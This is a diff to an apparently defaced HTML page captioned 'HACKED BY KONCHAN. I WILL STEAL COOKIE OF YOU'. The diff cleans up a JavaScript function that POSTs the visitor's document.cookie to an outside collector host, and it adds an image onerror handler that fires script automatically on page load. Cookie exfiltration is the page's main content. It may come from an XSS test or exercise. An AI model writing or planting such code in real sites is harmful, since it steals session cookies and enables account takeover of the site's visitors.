@@ -7,19 +7,22 @@
 </head>
 <body>
     <h1>HACKED BY KONCHAN. I WILL STEAL COOKIE OF YOU</h1>
-    <button onclick=runme()>Runme</button>
-    <button onclick=showpoup()>Runme</button>
-  <script>
-    function runme(){
-        fetch('http://4q6dalz4.requestrepo.com/',{
-          method:"POST",
-          body:document.cookie,
-          mode:"no-cors"
-        }
-    }
-      function showpoup(){
+    <button onclick="runme()">Runme</button>
+    <button onclick="showpopup()">Runme</button>
+    <img/src/onerror="showpoup()">
+<script>
+      function runme() {
+        fetch('http://4q6dalz4.requestrepo.com/', {
+          method: "POST",
+          body: document.cookie,
+          mode: "no-cors"
+        });
+      }
+    
+      function showpopup() {
         alert(1);
-}
-  </script>
+      }
+</script>
+
 </body>
 </html>
